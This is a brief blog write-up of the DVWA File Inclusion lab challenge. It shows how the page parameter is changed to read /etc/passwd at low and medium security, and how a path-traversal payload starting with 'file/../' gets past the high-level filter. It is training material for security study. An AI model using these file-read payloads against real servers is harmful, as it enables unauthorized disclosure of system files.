---
title: "File Inclusion - DVWA"
description: ""
summary: "Read the /etc/passwd file using File Inclusion vulnerability."
date: 2022-08-17
draft: false
author: "Aftab Sama" # ["Me", "You"] # multiple authors
tags: ["writeups", "challenge", "DVWA", "File Inclusion"]
canonicalURL: ""
showToc: true
TocOpen: false
TocSide: 'right'  # or 'left'
weight: 4
# aliases: ["/first"]
hidemeta: false
comments: false
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
# UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
# editPost:
#     URL: "https://github.com/"
#     Text: "Suggest Changes" # edit text
#     appendFilePath: true # to append file path to Edit link
---


### **Security level: low**

In url there is GET parameter `page` used for including file.

url:`http://192.168.170.131/vulnerabilities/fi/?page=include.php`

By changing this file location we can read file on server.

url:`http://192.168.170.131/vulnerabilities/fi/?page=/etc/passwd`

<img width="658" alt="image" src="https://user-images.githubusercontent.com/79740895/185410392-bf62fdae-c6c7-4f90-a934-191ffadcf471.png">


_Also work for medium._

### **Security level: high**

we have one condition that file name should start with `file`.

<img width="343" alt="image" src="https://user-images.githubusercontent.com/79740895/185414371-f1a0cb44-0688-40ab-ae49-1c623e19744f.png">

we can bypass that with payload:`file/../../../../../../etc/passwd` path traversal.

<img width="456" alt="image" src="https://user-images.githubusercontent.com/79740895/185414731-fda51955-9d13-4b60-893a-f700f29021eb.png">

Happy Hacking
